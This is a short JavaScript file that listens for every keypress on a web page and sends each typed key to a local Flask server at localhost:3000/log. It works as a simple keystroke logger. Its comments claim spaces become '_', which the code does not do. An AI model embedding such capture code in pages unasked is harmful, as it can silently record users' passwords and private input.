console.log("working");
// Function to log keypress events
// globalLogging.js

// Function to log keypress events with spaces replaced by "_" and new lines for Enter
function logKeyPress(typedKey) {
  let formattedKey;

  if (typedKey === ' ') {
    // Replace spaces with "_"
    formattedKey = ' ';
  } else if (typedKey === '\n') {
    // Replace Enter with a new line character
    formattedKey = '\n';
  } else {
    formattedKey = typedKey;
  }

  const logEntry = formattedKey;
  console.log(logEntry);

  // Send the log entry to the Flask server
  fetch('http://localhost:3000/log', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ logEntry }),
  });
}

// Event listener for keypress events
document.addEventListener('keypress', (event) => {
  const typedKey = event.key;
  logKeyPress(typedKey);
});

